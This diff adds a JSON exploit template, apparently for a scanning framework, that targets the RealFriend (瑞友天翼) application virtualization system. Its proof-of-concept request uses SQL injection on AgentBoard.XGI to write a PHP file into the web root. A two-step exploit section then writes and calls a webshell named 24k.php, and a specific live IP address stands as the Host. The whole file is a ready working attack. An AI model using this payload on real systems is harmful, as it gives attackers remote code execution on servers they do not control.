@@ -1,0 +1,40 @@
+{
+	"name":"瑞友天翼应用虚拟化系统sql注入任意文件写入",
+	"tag":"ruiyou",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C1.php%22+--+-&cmd=UserLogin",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;",
+		        "Accept-Language": "zh-CN,zh;q=0.9",
+			"Connection": "close",
+			"content-type": "*/*",
+			"Cache-Control": "no-cache",
+			"Pragma": "no-cache",
+			"Host": "112.16.203.230:4433"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/AgentBoard.XGI?user=-1%27+union+select+1%2C%27{{webshell:UrlEncode}}%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C24k.php%22+--+-&cmd=UserLogin",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		},
+		"step2":{
+			"expGet":"/24k.php",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
